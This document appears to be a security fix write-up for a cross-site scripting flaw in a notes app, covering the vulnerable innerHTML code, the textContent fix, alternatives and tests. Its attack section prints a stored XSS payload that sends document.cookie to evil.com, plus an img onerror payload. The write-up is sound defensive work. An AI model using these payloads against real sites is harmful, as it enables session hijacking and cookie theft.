# Security Fix #3: Cross-Site Scripting (XSS)

**Issue ID**: #3
**Location**: `frontend/app.js:14`
**Severity**: ERROR
**OWASP**: A05:2025 - Injection
**CWE**: CWE-79: Cross-Site Scripting

## Vulnerability Description

The `loadNotes` function was using `innerHTML` to insert user-controlled data (`n.title` and `n.content`) directly into the DOM. This is an anti-pattern that can lead to XSS vulnerabilities.

## Attack Vector

If a note contains malicious script content, it would be executed when the note is displayed:

**Stored XSS** (malicious note in database):
```
title: "Safe Title"
content: "<script>alert('XSS!');fetch('http://evil.com/steal?c='+document.cookie)</script>"
```

**Reflected XSS** (via search or other user input):
```
q: "<img src=x onerror=alert('XSS')>"
```

**Consequences**:
- Session hijacking (cookie theft)
- Data theft
- Phishing attacks
- Malware distribution
- Unauthorized actions on behalf of users

## Before (Vulnerable Code)

```javascript
async function loadNotes(params = {}) {
  const list = document.getElementById('notes');
  list.innerHTML = '';
  const query = new URLSearchParams(params);
  const notes = await fetchJSON('/notes/?' + query.toString());
  for (const n of notes) {
    const li = document.createElement('li');
    li.innerHTML = `<strong>${n.title}</strong>: ${n.content}`;
    list.appendChild(li);
  }
}
```

**Issues**:
- User-controlled content (`n.title`, `n.content`) inserted via `innerHTML`
- No HTML escaping or sanitization
- Any script tags or event handlers in note content will be executed
- Template literal interpolation does not escape HTML

## After (Secure Code)

```javascript
async function loadNotes(params = {}) {
  const list = document.getElementById('notes');
  list.innerHTML = '';
  const query = new URLSearchParams(params);
  const notes = await fetchJSON('/notes/?' + query.toString());
  for (const n of notes) {
    const li = document.createElement('li');
    // FIXED: Use textContent instead of innerHTML to prevent XSS
    const strong = document.createElement('strong');
    strong.textContent = n.title;
    li.appendChild(strong);
    const text = document.createTextNode(`: ${n.content}`);
    li.appendChild(text);
    list.appendChild(li);
  }
}
```

**Improvements**:
- Using `textContent` instead of `innerHTML` - content is treated as plain text
- DOM creation via `createElement` - no HTML parsing
- Any HTML in user data is displayed as literal text, not executed
- Maintains the same visual output with improved security

## Why This Fix Works

1. **textContent vs innerHTML**: `textContent` sets the text content without parsing HTML, preventing script execution.
2. **Safe DOM Creation**: Using `createElement` and `appendChild` avoids HTML interpretation.
3. **Automatic Escaping**: The browser escapes special characters when using text properties.
4. **No Template Literals**: Avoids template literal interpolation that could be misused.

## Alternative Approaches

If HTML formatting is needed, consider:
1. **Server-side sanitization**: Use a library like `bleach` (Python) to sanitize HTML before sending
2. **Client-side sanitization**: Use a library like DOMPurify to sanitize user HTML
3. **Markdown support**: Use a markdown parser that renders to safe HTML

## Testing Recommendations

1. Create a note with HTML tags (should display as text, not execute):
   ```javascript
   // Create note with HTML content
   POST /notes/ { "title": "<script>alert('xss')</script>", "content": "safe content" }
   ```

2. Verify the note displays the HTML as literal text:
   - The `<script>` tag should be visible in the UI
   - No alert should appear

3. Verify Semgrep scan no longer flags this issue:
   ```bash
   semgrep scan --json --output semgrep-results.json
   ```

## Related Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify - XSS sanitizer](https://github.com/cure53/DOMPurify)
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)

---

**Fixed**: 2026-04-06
